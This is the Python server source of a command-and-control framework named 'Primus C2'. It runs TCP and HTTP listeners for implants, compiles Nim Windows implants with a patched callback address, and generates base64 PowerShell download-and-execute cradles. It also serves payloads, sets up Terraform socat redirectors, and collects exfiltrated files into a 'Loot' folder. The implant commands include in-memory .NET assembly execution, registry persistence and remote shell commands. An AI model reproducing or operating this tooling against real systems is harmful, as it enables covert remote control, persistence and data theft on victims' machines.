import socket
import threading
from prettytable import PrettyTable
import time 
from datetime import datetime
import string, random, os
import os.path
import shutil
import subprocess
import fcntl
import struct
from http.server import HTTPServer, SimpleHTTPRequestHandler
import http.server
import base64
import randomname
from Cryptodome.PublicKey import RSA
import re
import atexit
from rich.progress import track
import secrets
import colorama
from colorama import Fore, Back, Style
import readline
from flask import Flask
from flask import request
from flask import jsonify
import logging
from flask import cli
from queue import Queue
from flask import abort
from flask import render_template
import psutil
import sys


project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.append(project_root)

from utils import RC4Util

cwd = os.getcwd()
rc4 = RC4Util.RC4()
template_folder = os.path.expanduser(f'{cwd[:-3]}/Templates/')
app = Flask(__name__, template_folder=template_folder) 

def banner():
    print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
    print('╠═╝├┬┘│││││ │└─┐  ║  By Oliver Albertsen')
    print('╩  ┴└─┴┴ ┴└─┘└─┘  ╚═╝')


def help():
    print(Fore.CYAN + '''
    ------------------------------------------------------------------------------------------------------
    Menu Commands
    ------------------------------------------------------------------------------------------------------
    listener -g <TYPE>          --> Generate a HTTP or TCP listener
    nimplant -g <TYPE>          --> Generate a compiled exe payload written in nim with advanced capabilities for windows for either TCP or HTTP
    callbacks                   --> List callbacks
    use <callback ID> [use 0]   --> Enter a callback session
    pwsh_cradle                 --> Generate a pwsh cradle for a payload on the payloads server
    kill <sessions_val>         --> Terminate active callback
    payloads                    --> List payloads available on for either transfer or execution
    exit                        --> exit from the server

    Implant Commands
    ------------------------------------------------------------------------------------------------------
    background                  --> Backgrounds current sessions
    exit                        --> Terminate current session
    GetAV                       --> Get the current AV running
    pwsh <COMMAND>              --> Load CLR and run powershell in unmanged runspace 
    execute-ASM <file> <args>   --> Execute .NET assembly from memory   
    ls                          --> List files in current directory
    cd <dir>                    --> Change current working directory
    pwd                         --> Print current working directory
    payloads                    --> List payloads available on for either transfer or execution
    shell <COMMAND>             --> Run Windows CMD commands on target
    sleep <milseconds>          --> Adjust callback time [Default 5000] - HTTP only
    persist <k_name> <payload>  --> Deploy regsitry persistance to run a payload on startup(OPSEC: RISKY) - HTTP only
    download <file>             --> Download file from target(dont use "" around file name or path) - HTTP only
    ''')

def help_implant():
    print(Fore.CYAN +'''
    ------------------------------------------------------------------------------------------------------
    Implant Commands
    ------------------------------------------------------------------------------------------------------
    background                  --> Backgrounds current sessions
    exit                        --> Terminate current session
    GetAV                       --> Get the current AV running
    pwsh <COMMAND>              --> Load CLR and run powershell in unmanged runspace 
    execute-ASM <file> <args>   --> Execute .NET assembly from memory
    ls                          --> List files in current directory
    cd <dir>                    --> Change current working directory
    pwd                         --> Print current working directory
    payloads                    --> List payloads available on for either transfer or execution
    shell <COMMAND>             --> Run Windows CMD commands on target
    sleep <milseconds>          --> Adjust callback time [Default 5000] - HTTP only
    persist <k_name> <payload>  --> Deploy regsitry persistance to run a payload on startup(OPSEC: RISKY) - HTTP only
    download <file>             --> Download file from impant(dont use "" around file name or path) - HTTP only
    ''')


def listener_handler(): # Function to handle incoming connections and send bytes over the socket
    try:
        sock.bind((host_ip, int(host_port)))
    except (OSError):
        print(f'{Fore.RED}[-] Adress already in use, please try another one')
    if listen_choice == "3":
        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting callback from implants on {re_ip_str}:{host_port} ')
    else:
        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting callback from implants on {host_ip}:{host_port}')
    
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.daemon = True
    t1.start()


    
def httpListenerHandler():
    global host_ip
    cli.show_server_banner = lambda *_: None
    flask_t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(host_port), debug=False, use_reloader=False))
    flask_t.daemon = True
    flask_t.start()

    addrs = psutil.net_if_addrs()
    print(f'{Fore.CYAN}Interfaces on system:' + Fore.RESET)
    for interface in addrs.keys():
        print(f'>> {Fore.CYAN}{interface}' + Fore.RESET)
        completer.add_keyword(interface)

    host_ip = resolve_ip(input(Fore.CYAN + '[#] Enter the interface to listen on: '+ Fore.RESET))
    print(f'{Fore.LIGHTYELLOW_EX}[*] HTTP listener started - Awaiting HTTP callbacks from implants on {host_ip}:{host_port}')



#############################################Flask Stuff#############################################
logging.getLogger('werkzeug').disabled = True


task_queue = {}


@app.route('/')
def hello():
    return render_template('index.html')

@app.route('/reg', methods=['POST'])
def register():
    
    # Access the data sent in the request
    data = request.get_json()

    # Extract the necessary information from the data
    
    key_validation = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'authKey')))
    if key_validation != auth_key:
        print(f'{Fore.RED}[-] An error occurred while registering the implant, likely due to incorrect key\n'+Fore.LIGHTYELLOW_EX +'Enter command#>', end="")
        return abort(403)
    id = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'id')))
    username = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'username')))
    os = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'os')))
    isadmin = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'isAdmin')))
    hostname = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'hostname')))
    publicIP = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'publicIP')))
    amsi = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'amsi')))
    if isadmin == "1":
        admin_value = 'Yes'
    else:
        admin_value = 'No'
    if 'windows' in os:
        pay_val = 1
    else:
        pay_val = 2
    
    if amsi == "0":
        amsi = 'Disabled'
    else:
        amsi = 'Running'
    
    task_queue[id] = []
    cur_time = time.strftime("%H:%M:%S",time.localtime())
    date = datetime.now()
    time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')
    
    if hostname is not None:
        targets.append([id, f"{hostname}@{publicIP}", time_record, username, admin_value, os, pay_val,'Active',amsi]) #Appending info to targets list
        print(f'{Fore.GREEN}[+] Callback recieved from {hostname}@{publicIP}\n' +Fore.LIGHTYELLOW_EX +'Enter command#> ', end="")
        
    else: 
        targets.append([id, publicIP, time_record, username, admin_value, os, 'Active'])
        print(f'{Fore.LIGHTYELLOW_EX}[+] Callback recieved from {publicIP}\n' + Fore.LIGHTYELLOW_EX+'Enter command#> ', end="")
        # Return a response
        
    return '200'

@app.route('/tasks/<agent_id>', methods=['GET'])
async def serve_tasks(agent_id):
    # Check if the agent exists in the task queues
    if agent_id in task_queue:
        # Retrieve the tasks for the agent
        tasks = []
        while len(task_queue[agent_id]) > 0:
            tasks.append(task_queue[agent_id].pop(0))
        # Return the tasks as a JSON response
        return jsonify(tasks)
    else:
        return '404'

@app.route('/result', methods=['POST'])
async def send_results():
    
    if request.headers.get('X-Upload') == 'true':
        try:
            data = request.get_json()
            agent_id = data[rc4.obf(RCKey,'id')]
            agent_id = rc4.deobf(RCKey,agent_id)
            print(f'Result from implant ID: {agent_id}')
            result = data[rc4.obf(RCKey,'data')]
            result = rc4.deobf(RCKey, result)
            filename = data[rc4.obf(RCKey,'filename')]
            filename = rc4.deobf(RCKey, filename)

            cwd_payload = os.getcwd()
            loot_loc = os.path.expanduser(f'{cwd_payload}/Loot')

            with open(f"{loot_loc}/{filename}", "w") as f:
                f.write(result)
            print(f'{Fore.GREEN}[+] File saved to loot directory at: {loot_loc}/{filename}')
            print(f'{Fore.LIGHTYELLOW_EX}{targets[num][3]}/{targets[num][1]}#>', end="")
        except:
            print(f'{Fore.RED}[-] An error occurred while receiving the file from the implant(likely due to encoding issues)')
            pass
    else:
    # Access the data sent in the request
        try:
            data = request.get_json()
            # Extract the necessary information from the data
            agent_id = data[rc4.obf(RCKey,'id')]
            agent_id = rc4.deobf(RCKey,agent_id)
            print(f'Result from implant ID: {agent_id}')
            result = data[rc4.obf(RCKey,'data')]
            result = rc4.deobf(RCKey, result)


            # Update the task in the task queue
            if agent_id in task_queue:
                if len(task_queue[agent_id]) > 0:
                    task_queue[agent_id].pop(0)  # Remove the completed task from the queue

            # Perform the logic to process the results received from the implant
            print(f'\n{Fore.LIGHTYELLOW_EX}Response received from task:{Fore.RESET}\n{result}\n{Fore.LIGHTWHITE_EX}{targets[num][3]}/{targets[num][1]}#>', end="")

            directory = os.getcwd()
            cleandir = os.listdir( directory )
            for item in cleandir:
                if item.endswith("NimByteArray.txt"):
                    os.remove( os.path.join( directory, item ) )
        except:
            print(f'{Fore.RED}[-] An error occurred while receiving the data from the implant(likely due to encoding issues)')
            pass


    return '200'

def add_task(command):
    if target_id not in task_queue:
        task_queue[target_id] = []
    task_queue[target_id].append(rc4.obf(RCKey,command))

def kill_http(target_id, command):
    add_task(command)
    targets[num][7] = Fore.RED + 'Dead' + Fore.RESET
    

def http_target_comm(target_id, targets, num, task_queue):
    while True:
        command = input(f'{Fore.LIGHTWHITE_EX}{targets[num][3]}/{targets[num][1]}#> ') 
        if len(command) == 0:
            continue
        elif command == 'help':
            help_implant()
        
        elif command == 'exit':
            add_task(command)
            targets[num][7] = Fore.RED + 'Dead' + Fore.RESET
            break

        elif command == 'background':
            break

        elif command.split(" ")[0] == 'execute-ASM':
            global outfile
            args = list(command.split(" "))
            if len(args) > 0:
                CSharpToNimByteArray(args[1])
            else:
                print(Fore.LIGHTYELLOW_EX + "Please provide a file name as an argument.")
                return                
            try:
                with open(outfile, "r") as f:
                    rub = f.read()
                size = os.stat(outfile).st_size
                print(f'{Fore.LIGHTYELLOW_EX}[*] Size of asm is: {size}')
                if target_id not in task_queue:
                    task_queue[target_id] = []
                command = rc4.obf(RCKey,command)
                rub = rc4.obf(RCKey,rub)
                task_queue[target_id].extend((command, rub))
            except:
                pass
        elif command == 'GetAV':
            add_task(command)
        elif command.split(" ")[0] == 'cd':
            add_task(command)
        elif command == 'pwd':
            add_task(command)
        elif command.split(" ")[0] == 'ls':
            add_task(command)
        elif command.split(" ")[0] == 'shell':
            add_task(command)
        elif command.split(" ")[0] == 'pwsh':
            add_task(command)
        elif command == 'payloads':
            payload_list()
        elif command.split(" ")[0] == 'persist':
            add_task(command)
        elif command.split(" ")[0] == 'download':
            add_task(command)
            
        else:
            print(f'{Fore.LIGHTYELLOW_EX}[*] Command not recognized')

    
def fix_base64_padding(base64_string):
    # Calculate the number of padding characters needed
    missing_padding = len(base64_string) % 4
    # Add the necessary padding
    if missing_padding:
        base64_string += b'=' * (4 - missing_padding)
    return base64_string

def comm_in(target_id):
    try:
        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting response...')

        size_data = target_id.recv(1024).decode()
        print(f'{Fore.LIGHTYELLOW_EX}[*] Size of response is: {size_data}')
        size = int(size_data.strip())

        # Receive the entire message
        output = b""
        while len(output) < size:
            chunk = target_id.recv(1024)
            if not chunk:
                break
            output += chunk
        output1 = fix_base64_padding(output)
        decoded_output = base64.urlsafe_b64decode(output1)
        result = decoded_output.decode().strip() + '\n'

        # Clear the buffer before returning
        target_id.recv(1024)
        return result
    except:
        print(f'{Fore.RED}[-] An error occurred while receiving data from the target')
        pass

def comm_out(target_id, message):
    message = str(message + '\n')
    target_id.send(message.encode())
    

def kill_signal(target_id, message):
    message = str(message)
    target_id.send(message.encode())

def target_comm(target_id, targets, num):
    while True:
        message = input(f'{Fore.LIGHTWHITE_EX}{targets[num][3]}/{targets[num][1]}#> ') + '\n'
        if len(message) == 0:
            continue
        if message == 'help':
            help_implant()
            
        else:
            comm_out(target_id, message)
            if message == 'exit\n':
                target_id.send(message.encode())
                target_id.close()
                targets[num][7] = Fore.RED + 'Dead' + Fore.RESET
                break
            if message == 'background\n':
                break

            if message == 'help\n':
                help_implant()
            
            if message == 'payloads':
                payload_list()
           
             
            if message == 'GetAV':
                pass

            if message.split(" ")[0] == 'execute-ASM':
                #sendasm(message)
                global outfile
                args = list(message.split(" "))
                if len(args) > 0:
                    CSharpToNimByteArray(args[1])
                else:
                    print(Fore.LIGHTYELLOW_EX + "Please provide a file name as an argument.")
                    return                

                with open(outfile, "r") as f:
                    rub = f.read()
                size = os.stat(outfile).st_size
                print(f'{Fore.LIGHTYELLOW_EX}[*] Size of asm is: {size}')
                size1 = str(size)
                comm_out(target_id, size1)
                print(Fore.GREEN + "[+] Sent asm size to client")
                rub = str(rub) + "\n"
                target_id.send(rub.encode())
                print(Fore.GREEN + "[+] Sent asm to client")
                os.remove(outfile)
                response = comm_in(target_id)
                print(response)
                
                
            else:
                response = comm_in(target_id)
                if response == 'exit':
                    print(Fore.RED + '[-] The client has terminated the session')
                    target_id.close()
                    break
                print(response)


def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            key_validation = remote_target.recv(4096).decode()
            key_validation = base64.b64decode(key_validation).decode()
            if key_validation == auth_key:
                username = remote_target.recv(4096).decode()
                username = base64.b64decode(username).decode()
                admin = remote_target.recv(4096).decode()
                admin = base64.b64decode(admin).decode()
                operating_system = remote_target.recv(4096).decode()
                operating_system = base64.b64decode(operating_system).decode()
                host_name = remote_target.recv(4096).decode()
                host_name = base64.b64decode(host_name).decode()
                public_ip = remote_target.recv(4096).decode()
                public_ip = base64.b64decode(public_ip).decode()
                if admin == "1":
                    admin_value = 'Yes'
                elif username == 'root':
                    admin_value = 'Yes'
                else:
                    admin_value = 'No'
                if 'windows' in operating_system:
                    pay_val = 1
                else:
                    pay_val = 2
                amsi_tcp = "N/A"
                cur_time = time.strftime("%H:%M:%S",time.localtime())
                date = datetime.now()
                time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')

                if host_name is not None:
                    targets.append([remote_target, f"{host_name}@{public_ip}", time_record, username, admin_value, operating_system, pay_val,'Active', amsi_tcp]) #Appending info to targets list
                    print(f'{Fore.GREEN}[+] Callback recieved from {host_name}@{public_ip}\n' +Fore.LIGHTYELLOW_EX +'Enter command#> ', end="")
                else: 
                    targets.append([remote_target, remote_ip[0], time_record, username, admin_value, operating_system, 'Active'])
                    print(f'{Fore.LIGHTYELLOW_EX}[+] Callback recieved from {remote_ip[0]}\n' + Fore.LIGHTYELLOW_EX+'Enter command#> ', end="")
            else:
                remote_target.close()
        except:
            pass




def nimplant():
    global host_ip
    global host_port
    random_name = randomname.get_name()
    compile_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
    cwd_nim = os.getcwd()
    f_name= f'{compile_name}.nim'
    exe_file = f'{random_name}.exe'
    file_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant.nim')
    implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
    if os.path.exists(file_loc):
        shutil.copy(file_loc, f_name)
        shutil.move(f_name, implant_loc)
    else:
        print(f'{Fore.RED}[-] implant.nim not found in {file_loc}')
    print(Fore.CYAN + '[*] Use listener address or specify other IP for implant to connect to: ')
    print(Fore.CYAN + '[*] 1. Listener adress')
    print(Fore.CYAN + '[*] 2. Other IP')
    imp_choice = input(Fore.LIGHTYELLOW_EX + '[#] Enter 1 or 2: ' + Fore.RESET)
    if imp_choice == "1":
        pass
    else:
        host_ip = input('[*] Specify IP: ')
    with open(f'{implant_loc}/{f_name}') as f:
        patch_host = f.read().replace('INPUT_IP', str(host_ip.strip()))
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_host)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        patch_port = f.read().replace('INPUT_PORT', str(host_port))
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_port)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        new_key = f.read().replace('AUTH_KEY', auth_key)
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(new_key)
        f.close()
    compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip", "--cpu:amd64",f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
    for _ in track(range(4), description=f'[green][*] Compiling executeable {exe_file}...'):
        process = subprocess.Popen(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        process.wait()
    implant_loc = os.path.join(implant_loc, exe_file)
    if os.path.exists(implant_loc):
        print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')   
    else:
        print(Fore.RED + '[-] An error occurred while compiling the implant')
    implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
    os.remove(f'{implant_loc}/{f_name}')

def nimplant_HTTP():
    global host_ip
    global host_port
    random_name = randomname.get_name()
    compile_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
    cwd_nim = os.getcwd()
    f_name= f'{compile_name}.nim'
    exe_file = f'{random_name}.exe'
    
    URL = f'{host_ip}:{host_port}'
    id = (''.join(random.choices(string.ascii_lowercase, k=4)))
    
    file_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant_HTTP.nim')
    implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
    if os.path.exists(file_loc):
        shutil.copy(file_loc, f_name)
        shutil.move(f_name, implant_loc)
    else:
        print(f'{Fore.RED}[-] implant_HTTP.nim not found in {file_loc}')
    print(Fore.CYAN + '[*] Use listener address or specify other IP for implant to connect to: ')
    print(Fore.CYAN + '[*] 1. Listener adress')
    print(Fore.CYAN + '[*] 2. Other IP')
    imp_choice = input(Fore.LIGHTYELLOW_EX + '[#] Enter 1 or 2: ' + Fore.RESET)
    if imp_choice == "1":
        pass
    else:
        host_ip = input('[*] Specify IP: ')
    with open(f'{implant_loc}/{f_name}') as f:
        patch_host = f.read().replace('URL', str(URL.strip()))
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_host)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        patch_port = f.read().replace('ID', str(id))
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_port)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        new_key = f.read().replace('AUTH_KEY', auth_key)
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(new_key)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        RC_patch = f.read().replace('RCKEY', RCKey)
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(RC_patch)
        f.close()
    compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
    for _ in track(range(4), description=f'[green][*] Compiling executeable {exe_file}...'):
        process = subprocess.Popen(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        process.wait()
    implant_loc = os.path.join(implant_loc, exe_file)
    if os.path.exists(implant_loc):
        print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')   
    else:
        print(Fore.RED + '[-] An error occurred while compiling the implant')
    implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
    os.remove(f'{implant_loc}/{f_name}')

def resolve_ip(interface):
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(), 0x8915,  # SIOCGIFADDR
        struct.pack('256s', interface[:15].encode('utf-8'))
        )[20:24])
    
        

def pwsh_cradle():
   
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
    payload_name = []
    global check_file_loc 
    for file in os.listdir(payload_loc):
        payload_name.append(file)
        check_file_loc = os.path.expanduser(f'{cwd_payload}/Payloads/{file}')


    for i in payload_name:
        if os.path.exists(check_file_loc):
            runner_file = (''.join(random.choices(string.ascii_lowercase, k=8)))
            runner_file = f'{runner_file}.exe'
            random_exe = (''.join(random.choices(string.ascii_lowercase, k=6)))
            random_exe = f'{random_exe}.exe'
            payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
            print(f'{Fore.LIGHTGREEN_EX}[*] Payload server available at {host_ip}:8999')
            runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{host_ip}:8999/{runner_file}')".encode('utf-16le')
            with open(runner_file, 'w') as f:
                f.write(f'powershell -c wget http://{host_ip}:8999/{i} -outfile {random_exe};Start-Process -FilePath {random_exe} ')
                f.close()
                shutil.move(runner_file, payload_loc)
            b64_runner = base64.b64encode(runner_cal_unencoded)
            b64_runner = b64_runner.decode()
            print(f'{Fore.CYAN}\n[+] B64 encoded payload\n\npowershell -e {b64_runner}')
            b64_runner_decoded = base64.b64decode(b64_runner).decode()
            print(f'{Fore.CYAN}\n[+] Unencoded payload\n\n{b64_runner_decoded}')
        else:
            print(f'{Fore.RED}[-] {check_file_loc} does not exist in payloads folder... Try another payload ')

        

def web_payload_server():
    
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=payload_loc, **kwargs)

    http_handler = Handler
    http_handler.log_message = lambda *args, **kwargs: None
    server = http.server.ThreadingHTTPServer((host_ip, 8999), http_handler)
    
    print(f'{Fore.GREEN}[+] Payload server is running at http://{host_ip}:8999')
    thread = threading.Thread(target = server.serve_forever)
    thread.daemon = True
    thread.start()
    

def redirector(LPORT):
    key_loc = os.path.expanduser('~/.ssh/id_rsa')
    if os.path.exists(key_loc):
        print(Fore.LIGHTGREEN_EX + '[+] Keypair already present...')
    else:
        print(Fore.LIGHTYELLOW_EX + '[*] Generating SSH keypair...')
        key = RSA.generate(2048)
        f = open("id_rsa", "wb")
        f.write(key.exportKey('PEM'))
        f.close()

        pubkey = key.publickey()
        f = open("id_rsa.pub", "wb")
        f.write(pubkey.exportKey('OpenSSH'))
        f.close()

        priv_key_loc = os.path.expanduser('id_rsa')
        pub_key_loc = os.path.expanduser('id_rsa.pub')
        shutil.move(priv_key_loc, key_loc)
        shutil.move(pub_key_loc, key_loc)

    old_cwd = os.getcwd()
    cwd = os.getcwd()
    terra_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform')
    redir_loc = os.path.expanduser(f'{cwd[:-3]}/Templates/redirector_template.tf')
    script_loc = os.path.expanduser(f'{cwd[:-3]}/Templates/script.sh')
    redir_copy_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform/redirector.tf')
    script_copy_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform/script.sh')
    script_name = "script.sh"
    redirector_name = "redirector.tf"
    if os.path.exists(redir_loc):
        shutil.copy(redir_loc, redir_copy_loc)
        print(Fore.LIGHTYELLOW_EX +'[*] Patching listening port...')
        with open(f'{terra_loc}/{redirector_name}') as f:
            patch_host = f.read().replace('LPORT', str(LPORT))
        with open(f'{terra_loc}/{redirector_name}', 'w') as f:
            f.write(patch_host)
            f.close()
            
    if os.path.exists(script_loc):
        shutil.copy(script_loc, script_copy_loc)
        with open(f'{terra_loc}/{script_name}') as f:
            patch_host = f.read().replace('LPORT', str(LPORT))
        with open(f'{terra_loc}/{script_name}', 'w') as f:
            f.write(patch_host)
            f.close()
            print(Fore.GREEN +'[+] Listening port patched\n')
    
    print(Fore.LIGHTYELLOW_EX +'[*] Provisioning and configuring redirector... This will take a couple minutes')
    os.chdir(terra_loc)
    os.system("terraform init")
    terra_cmd = ["terraform", "apply", "-auto-approve"]
    process = subprocess.Popen(terra_cmd, stdout=subprocess.PIPE)
    output = process.stdout.read()
    redir_ip = re.findall(r'\b0mdroplet_ip_address \= \"(\d+\.\d+\.\d+.\d+)', output.decode('utf-8'))
    global re_ip_str
    re_ip_str = "".join(redir_ip)
    process.wait()

    print(Fore.LIGHTYELLOW_EX + '[*] Running socat relay trough SSH.. wait a moment.')
    subprocess.run(["ssh", f"root@{re_ip_str}", "/tmp/script.sh"],
        shell=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False)
    print(Fore.GREEN + '[+] Socat relay configured...')
    print(Fore.LIGHTYELLOW_EX + '[*] Setting up reverse port forward on localhost')
    os.system(f"ssh -N -R 4567:localhost:{host_port} root@{re_ip_str} &")
    os.chdir(old_cwd)


def CSharpToNimByteArray(inputfile, folder=False):
    global outfile
    try:
        if folder:
            files = os.listdir(inputfile)
            for file in files:
                print(f"{Fore.LIGHTYELLOW_EX}[*] Converting {file}")
                outfile = file + "NimByteArray.txt"
        
                with open(file, "rb") as f:
                    hex_data = f.read().hex()
                    hex_string = ",0x".join(hex_data[i:i+2] for i in range(0, len(hex_data), 2))
                    hex_string = "0x" + hex_string
                    with open(outfile, "w", encoding="utf-8") as out:
                        out.write(hex_string)
        
            print(Fore.GREEN + "[*] Results Written to the same folder")
        else:
            
            cwd_payload = os.getcwd()
            inputfile_path = os.path.expanduser(f'{cwd_payload}/Payloads')
            print(f"Converting {inputfile}")
            outfile = inputfile + "NimByteArray.txt"
            
            with open(f'{inputfile_path}/{inputfile}', "rb") as f:
                hex_data = f.read().hex()
                hex_string = ",0x".join(hex_data[i:i+2] for i in range(0, len(hex_data), 2))
                hex_string = "0x" + hex_string
                with open(outfile, "w", encoding="utf-8") as out:
                    out.write(hex_string)
            
            print(f"{Fore.GREEN}[*] Result Written to {outfile}")


        # dos2unix conversion
        with open(outfile, "r") as f:
            content = f.read()
            with open(outfile, "w") as out:
                out.write(content.replace("\r\n", "\n"))
    except:
        print(f"{Fore.RED}[-] File not found")
        pass

class MyCompleter(object):  

    def __init__(self, options):
        self.options = sorted(options)

    def complete(self, text, state):
        if state == 0:  
            if text: 
                self.matches = [s for s in self.options 
                                    if s and s.startswith(text)]
            else: 
                self.matches = self.options[:]

       
        try: 
            return self.matches[state]
        except IndexError:
            return None
    
    def add_keyword(self, keyword):
        self.options.append(keyword)
        self.options = sorted(self.options)

def payload_list():
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
    print(f'{Fore.LIGHTYELLOW_EX}[*] Available payloads: ')
    for file in os.listdir(payload_loc):
        print(f'{Fore.CYAN}>> {file}')
        if file not in keywords:
            completer.add_keyword(file)

def payload_keyword_add():
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
    for file in os.listdir(payload_loc):
        if file not in keywords:
            completer.add_keyword(file)

def exit_handler():
    cwd = os.getcwd()
    print(Fore.LIGHTYELLOW_EX + '[*] Destroying redirector infrastructure...')
    terra_loc = os.path.expanduser(f'{cwd.strip("C2")}/Terraform')
    os.chdir(terra_loc)
    os.system("terraform destroy -auto-approve")

    try:
        print(Fore.LIGHTYELLOW_EX + '[*] Cleaning up files...')
        os.remove("script.sh")
        os.remove("redirector.tf")
        print(Fore.GREEN + '[+] Files succesfully cleaned')
        
    except:
        print(Fore.RED+'[-] File not found.')

if __name__ == '__main__':
    global keywords
    keywords = ["listener -g","HTTP", "TCP" ,"nimplant -g", "callbacks","download","use ", "pwsh_cradle", "kill ", "exit", "help","payloads", "background", "persist", "GetAV", "pwsh", "execute-ASM", "ls", "cd", "pwd", "shell"]
    completer = MyCompleter(keywords)
    readline.set_completer(completer.complete)
    readline.parse_and_bind('tab: complete')
    for kw in keywords:
        readline.add_history(kw)
    colorama.init(autoreset=True)
    targets = [] #store each socket connection
    listener_count = 0
    banner()
    
    kill_flag = 0
    global host_ip
    global host_port
    global listen_type
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if not os.path.exists('Generated_Implants'):
        print(Fore.LIGHTYELLOW_EX + "[+] Creating Generated Implants Directory...")
        os.mkdir('Generated_Implants')
    if not os.path.exists('Payloads'):
        print(Fore.LIGHTYELLOW_EX + "[+] Creating Payloads Directory...")
        os.mkdir('Payloads')
    if not os.path.exists('Loot'):
        print(Fore.LIGHTYELLOW_EX + "[+] Creating Loot Directory...")
        os.mkdir('Loot')
    
    payload_keyword_add()
    length_gen = secrets.SystemRandom()
    key_length = length_gen.randint(12,33)
    auth_key = (''.join(secrets.token_urlsafe(key_length)))
    
    RCkey_length = length_gen.randint(12,18)
    RCKey = (''.join(secrets.token_urlsafe(key_length)))
    print(f'{Fore.CYAN}[+] AuthKey for this session is {auth_key}')


    while True:
        try:
            command = input(Fore.LIGHTYELLOW_EX +'Enter command#>' + Fore.RESET)
            if command == 'help':
                help()
            elif command == 'payloads':
                payload_list()
            if command == 'listener -g TCP':
                listen_type = 'TCP'
                try:
                    print(Fore.CYAN + '[*] 1. Interface')
                    print(Fore.CYAN + '[*] 2. IP-Address')
                    print(Fore.CYAN + '[*] 3. Listener with redirector\n ')
                    listen_choice = (input(Fore.LIGHTYELLOW_EX + '[*] Choose an option: ' + Fore.RESET))
                except (OSError, ValueError, TypeError):
                    print(Fore.RED + '[-] No such option... Please try again')
                
                if listen_choice == '1':
                    while True:
                        try:
                            host_ip = resolve_ip(input(Fore.CYAN + '[#] Enter the interface to listen on: '+ Fore.RESET))
                            host_port = int(input(Fore.CYAN + '[#] Enter listening port: '+ Fore.RESET))
                            break  # exit the loop if no exception was raised
                        except (OSError, ValueError, TypeError):
                            print(Fore.RED + '[-] No such Interface or port... Please try again')
                elif listen_choice == 2:
                    
                    while True:
                        try:
                            host_ip = input('[#] Enter the IP to listen on: ')
                            host_port = int(input('[#] Enter listening port: '))
                            break  # exit the loop if no exception was raised
                        except (OSError, ValueError, TypeError):
                            print('[-] No such IP or port... Please try again')
                elif listen_choice == '3':
                    host_ip = resolve_ip("lo")
                    host_port = int(input('[#] Enter listening port: '))
                    redirector(host_port)
                
                listener_handler()
                listener_count +=1
                web_payload_server()
            elif command == 'listener -g HTTP':
                listen_type = 'HTTP'
                host_port = int(input(Fore.CYAN + '[#] Enter listening port: ' + Fore.RESET))
                httpListenerHandler()
                listener_count +=1
                web_payload_server()
            elif command == 'nimplant -g TCP':
                if listener_count > 0:
                    nimplant()
                else:
                    print('[-] Cannot compile payload without active listener')
            elif command == 'nimplant -g HTTP':
                if listener_count > 0:
                    nimplant_HTTP()
                else:
                    print('[-] Cannot compile payload without active listener')
